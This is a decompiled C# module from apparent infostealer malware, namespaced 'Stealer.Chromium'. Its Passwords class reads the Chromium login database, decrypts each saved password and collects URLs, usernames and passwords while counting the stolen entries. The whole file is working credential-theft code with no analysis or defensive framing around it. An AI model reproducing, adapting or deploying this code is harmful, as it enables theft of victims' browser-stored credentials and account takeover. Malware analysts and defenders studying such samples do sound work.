using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000029 RID: 41
	internal sealed class Passwords
	{
		// Token: 0x060000B3 RID: 179 RVA: 0x00007900 File Offset: 0x00005B00
		public static List<Password> Get(string sLoginData)
		{
			List<Password> list2;
			try
			{
				List<Password> list = new List<Password>();
				SQLite sqlite = SqlReader.ReadTable(sLoginData, "logins");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Password password = default(Password);
						password.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						password.sUsername = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						string value = sqlite.GetValue(i, 5);
						bool flag2 = value != null;
						if (flag2)
						{
							password.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value, false));
							list.Add(password);
							Counter.Passwords++;
						}
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<Password>();
			}
			return list2;
		}
	}
}
